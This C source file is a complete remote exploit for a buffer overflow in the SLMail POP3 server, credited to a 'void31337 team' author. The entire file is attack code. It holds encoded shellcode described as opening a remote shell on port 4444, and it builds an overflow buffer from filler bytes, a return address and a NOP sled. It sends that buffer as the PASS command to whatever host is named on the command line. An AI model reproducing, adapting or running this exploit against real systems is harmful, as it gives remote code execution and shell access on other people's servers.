/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] remote to 4444 
unsigned char shellcode[] = 
"\xbd\x10\x2f\x71\xbb\xda\xdf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x6a\x12\x83\xea\xfc\x03\x7a\x21\x93\x4e\x86\xd5\xd1"
"\xb1\x76\x26\xb6\x38\x93\x17\xf6\x5f\xd0\x08\xc6\x14\xb4\xa4"
"\xad\x79\x2c\x3e\xc3\x55\x43\xf7\x6e\x80\x6a\x08\xc2\xf0\xed"
"\x8a\x19\x25\xcd\xb3\xd1\x38\x0c\xf3\x0c\xb0\x5c\xac\x5b\x67"
"\x70\xd9\x16\xb4\xfb\x91\xb7\xbc\x18\x61\xb9\xed\x8f\xf9\xe0"
"\x2d\x2e\x2d\x99\x67\x28\x32\xa4\x3e\xc3\x80\x52\xc1\x05\xd9"
"\x9b\x6e\x68\xd5\x69\x6e\xad\xd2\x91\x05\xc7\x20\x2f\x1e\x1c"
"\x5a\xeb\xab\x86\xfc\x78\x0b\x62\xfc\xad\xca\xe1\xf2\x1a\x98"
"\xad\x16\x9c\x4d\xc6\x23\x15\x70\x08\xa2\x6d\x57\x8c\xee\x36"
"\xf6\x95\x4a\x98\x07\xc5\x34\x45\xa2\x8e\xd9\x92\xdf\xcd\xb5"
"\x57\xd2\xed\x45\xf0\x65\x9e\x77\x5f\xde\x08\x34\x28\xf8\xcf"
"\x3b\x03\xbc\x5f\xc2\xac\xbd\x76\x01\xf8\xed\xe0\xa0\x81\x65"
"\xf0\x4d\x54\x29\xa0\xe1\x07\x8a\x10\x42\xf8\x62\x7a\x4d\x27"
"\x92\x85\x87\x40\x39\x7c\x40\x65\xb5\x7e\x44\x11\xcb\x7e\x75"
"\xbe\x42\x98\x1f\x2e\x03\x33\x88\xd7\x0e\xcf\x29\x17\x85\xaa"
"\x6a\x93\x2a\x4b\x24\x54\x46\x5f\xd1\x94\x1d\x3d\x74\xaa\x8b"
"\x29\x1a\x39\x50\xa9\x55\x22\xcf\xfe\x32\x94\x06\x6a\xaf\x8f"
"\xb0\x88\x32\x49\xfa\x08\xe9\xaa\x05\x91\x7c\x96\x21\x81\xb8"
"\x17\x6e\xf5\x14\x4e\x38\xa3\xd2\x38\x8a\x1d\x8d\x97\x44\xc9"
"\x48\xd4\x56\x8f\x54\x31\x21\x6f\xe4\xec\x74\x90\xc9\x78\x71"
"\xe9\x37\x19\x7e\x20\xfc\x39\x9d\xe0\x09\xd2\x38\x61\xb0\xbf"
"\xba\x5c\xf7\xb9\x38\x54\x88\x3d\x20\x1d\x8d\x7a\xe6\xce\xff"
"\x13\x83\xf0\xac\x14\x86";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char buf[3012];
      char evil[2977];
      char receive[1024];
      char offset[2606];
      char memaddr[] = "\x8f\x35\x4a\x5f";
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";

      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 2977);
      memset(offset, 0x00, 2606);
      memset(offset, 0x41, 2606);
      strcat(evil, offset);
      strcat(evil, memaddr);
      strcat(evil, nopsled);
      strcat(evil, shellcode);
 
      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
